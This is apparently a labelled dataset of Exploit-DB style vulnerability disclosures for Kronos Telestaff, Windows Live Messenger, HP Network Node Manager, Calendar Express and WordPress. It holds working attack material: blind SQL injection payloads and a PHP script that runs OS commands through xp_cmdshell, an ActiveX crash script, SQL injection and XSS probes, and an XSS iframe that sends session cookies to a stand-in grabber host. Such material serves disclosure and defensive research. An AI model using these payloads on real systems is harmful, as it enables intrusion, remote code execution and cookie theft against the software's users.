42127,"Kronos Telestaff < 2.92EU29 - SQL Injection Software: Kronos Telestaff Web Application Version: < 2.92EU29 Homepage: http://www.kronos.com/ CERT VU: VU#958480 CVE: (Pending) CVSS: 10 (Low; AV:N/AC:L/Au:N/C:C/I:C/A:C) CWE: CWE-89    Vulnerable Component: Login page   Description ================ The login form is vulnerable to blind SQL injection by an unauthenticated user.   Vulnerabilities ================ The vulnerability is due to the unsanitized POST parameter 'user' in login page: URL: [BASE URL OF Telestaff Application]/servlet/ServletController.asp POSTDATA=device=stdbrowser&action=doLogin&user=&pwd=&code=  The exploit requires a valid ""code"" in the post body.  However in almost all instances we found on the internet, the ""code"" POST variable was hard-coded into the page.  Furthermore, the ""code"" POST variable is very often a 4 digit number - and can be easily discovered in ~5000 requests.     Proof of concept ================ PoC 1 - extract data from database example extract benign data e.g.  Injection Point:  [BASE URL OF Telestaff Application]/servlet/ServletController.asp POST data:  device=stdbrowser&action=doLogin&user=')if(DB_NAME()='TELESTAFF')waitfor%20delay'00%3a00%3a12';--&pwd=&code=<valid code>  compare timing with  device=stdbrowser&action=doLogin&user=')if(DB_NAME()<>'TELESTAFF')waitfor%20delay'00%3a00%3a12';--&pwd=&code=<valid code>   PoC 2 - Execute Code Remotely example inject benign code e.g. ping a remote systems  <?php 	$cmd_to_execute = strToHex(""ping -n 1 receive_ping_host"");  // insert you own host here to detect dns lookup and/or ping; or insert other command  	$code=XXXX // insert valid code 	$target_url= // insert login page url of target system i.e. example.com/webstaff-2.0/servlet/ServletController.asp?device=stdbrowser&action=doLogin&selfhosted=true 	$payload=""DECLARE @lphda VARCHAR(280);SET @lphda="".$cmd_to_execute."";EXEC master..xp_cmdshell @lphda""; 	$payload=str_replace("" "",""%20"",$payload); 	$postdata=""device=stdbrowser&action=doLogin&user=')"".$payload.""---&pwd=test&code="".$code;  	$ch = curl_init(); 	curl_setopt($ch, CURLOPT_URL, $target_url); 	curl_setopt($ch, CURLOPT_POST, TRUE); 	curl_setopt($ch, CURLOPT_POSTFIELDS, $postdata); 	curl_exec($ch);  	function strToHex($string){ 	  $hex = ''; 	  for ($i=0; $i<strlen($string); $i++){ 		$ord = ord($string[$i]); 		$hexCode = dechex($ord); 		$hex .= substr('0'.$hexCode, -2); 	  } 	  return ""0x"".strToUpper($hex); 	}  	 Affected Systems ================ From Vendor: Customers running TeleStaff version 2.x with Self Hosted Web Access, those customers who host their own web access, are affected and Kronos recommends that you upgrade to TeleStaff 2.92EU29 or Workforce TeleStaff.   Solution ================ From Vendor:  Though there is no further action needed after the installation of the update there are a couple of best practices that we suggest to further secure the production environment. 	1. We recommend that the Web Staff Middle Tier be locked down to only be accessed from the source addresses.  For Self-Hosted Web Access this would be the Internet facing IIS server hosting the Self Hosted WebStaff module. For customers using WebStaff (www.telestaff.net) and PSM (psm.telestaff.net and m.telestaff.net) those are the IP addresses of the Kronos servers. 	2. Customers, once configured, should remove the viewDatabases.asp script to avoid accidental information leakage to unauthorized users.  	 Timeline ================ 2015-12-18: Discovered 2016-01-04: Contacted Vendor 2016-01-11: Report sent to vendor  2016-01-20: Received acknowledgement of vulnerable from security contact info at vendor 2016-01-20: Vendor is remediating the issue  2016-10-18: Vendor issues patch 2017-06-01: Public disclosure    Discovered by ================ Chris Anastasio 0x616e6173746173696f [ at ] illumant.com Mark F. Snodgrass  0x736e6f646772617373 [ at ] illumant.com   About Illumant ================ Illumant has conducted thousands of security assessment and compliance engagements, helping over 800 clients protect themselves from cyber-attacks.  Through meticulous manual analysis, Illumant helps companies navigate the security and threat landscape to become more secure, less of a target, and more compliant.  For more information, visit https://illumant.com/",.kronos.,1
11070,"Microsoft Windows Live Messenger 2009 - ActiveX Denial of Service Product: Windows Live Messenger 2009 (Build 14.0.8089.726)  ************************************************************************ ******** Vulnerability: ActiveX - Denial of Service  ************************************************************************ ******** Discussion: Vulnerability is in Activex Control(msgsc.14.0.8089.726.dll) Sending a string to ViewProfile() , cause a crash on msnmsgr.exe *must be signed in Msn Messenger account for triggerin the vulnerability.  ************************************************************************ ******** Vulnerable: Windows Live Messenger 2009 on Windows Vista Windows Live Messenger 2009 on Windows 7  Not Vulnerable: Windows Live Messenger 2009 on Windows XP  Credits: HACKATTACK IT SECURITY GmbH Penetration Testing in Deutschland - Österreich - Schweiz www.hackattack.com  and  Natal Networks Inc. Vulnerability Discovery, Penetration Testing, IT Security Consulting www.natalnetworks.com  ************************************************************************ ********  Original Advisory www.hackattack.com www.natalnetworks.com  ************************************************************************ ******** PoC .wsf script: 'works on vista and windows7  <package>  <job id='DoneInVBS' debug='false' error='true'>  <object classid='clsid:B69003B3-C55E-4B48-836C-BC5946FC3B28' id='target' />  <script language='vbscript'>  arg1=(""AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA"")  target.ViewProfile arg1  </script>  </job>  </package>  About HACKATTACK and Natal Networks ================ HACKATTACK IT SECURITY GmbH is a Penetrationtest and Security Auditing company located in Germany and Austria More Information about HACKATTACK at http://www.hackattack.com  Natal Networks was founded by Hellcode Research Team in 2009. Main mission of Natal Network is discover and research vulnerabilities. Providing penetration tests and security auditing services. More about; www.natalnetworks.com",.hackattack.,1
36357,HP Network Node Manager (NMM) i 9.10 - 'nnm/protected/traceroute.jsp?nodename' Cross-Site Scripting source: https://www.securityfocus.com/bid/50806/info      HP Network Node Manager i is prone to multiple unspecified cross-site scripting vulnerabilities because it fails to properly sanitize user-supplied input.      An attacker may leverage these issues to execute arbitrary script code in the browser of an unsuspecting user in the context of the affected site. This may allow the attacker to steal cookie-based authentication credentials and launch other attacks.      http://www.example.com/protected/traceroute.jsp?nodename=[xss],HP,1
26114,"PHP Lite Calendar Express 2.2 - 'Subscribe.php?cid' SQL Injection source: https://www.securityfocus.com/bid/14504/info    Calendar Express is prone to multiple SQL-injection vulnerabilities because the application fails to properly sanitize user-supplied input before using it in SQL queries.    A successful exploit could allow an attacker to compromise the application, access or modify data, or exploit vulnerabilities in the underlying database.   http://www.example.com/calendarexpress/subscribe.php?cid='",PHP,0
29682,WordPress Core 2.1.1 - 'post.php' Cross-Site Scripting source: https://www.securityfocus.com/bid/22735/info  Wordpress is prone to a cross-site scripting vulnerability because the application fails to properly sanitize user-supplied input.  An attacker may leverage this issue to execute arbitrary script code in the browser of an unsuspecting user. This may help the attacker steal cookie-based authentication credentials and launch other attacks.  Wordpress 2.1.1 is vulnerable to this issue; other versions may also be affected.   Cookie in an Alert Box: <iframe width=600 height=400 src='http://www.example.com/wp-admin/post.php?action=delete&post=%27%3E%3Cscript%3Ealert(document.cookie)%3C/script%3E%3Clol= %27'></iframe> Cookie send to an Evil Host: <iframe width=600 height=400 src='http://www.example.com/wp-admin/post.php?action=delete&post=%27%3E%3Cscript%3Eimage=document.createElement(%27img%27);im age.src=%27http://www.example.com/datagrabber.php?cookie=%27%2bdocument.cookie;%3C/script%3E%3Clol=%27'></iframe>,WordPress,1
